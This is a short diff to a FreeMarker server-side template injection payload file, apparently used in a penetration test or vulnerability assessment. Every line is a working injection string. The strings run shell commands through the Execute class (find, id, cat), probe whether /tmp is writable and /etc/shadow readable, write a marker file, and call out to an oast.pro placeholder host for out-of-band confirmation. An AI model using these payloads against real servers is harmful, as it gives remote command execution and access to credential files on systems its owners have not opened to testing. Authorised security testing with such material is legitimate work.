@@ -1,5 +1,11 @@
-${"freemarker.template.utility.Execute"?new()("find / -name freemarker*.jar")}
-${("java.io.PrintWriter"?new()("/tmp/VA_SOW_66143.txt")).append("VA_SOW_66143 write test via freemarker SSTI").checkError()?c}
-
+VER=${.version}
+JAR=${"freemarker.template.utility.Execute"?new()("find / -name freemarker*.jar")}
 ID=${"freemarker.template.utility.Execute"?new()("id")}
-PING=${("java.net.URL"?new()("http://YOUROASTID.oast.pro/fm-ssti-ping")).openStream().toString()}
+TMPW=${("java.io.File"?new()("/tmp")).canWrite()?c}
+SHDW=${("java.io.File"?new()("/etc/shadow")).canRead()?c}
+
+
+W=${("java.io.PrintWriter"?new()("/tmp/VA_SOW_66143.txt")).append("VA_SOW_66143 write test via freemarker SSTI").checkError()?c}
+
+CAT=${"freemarker.template.utility.Execute"?new()("cat /tmp/VA_SOW_66143.txt")}
+PING=${("java.net.URL"?new()("http://YOUR-REAL-PAYLOAD.oast.pro/fm-ssti-ping")).openStream().toString()}
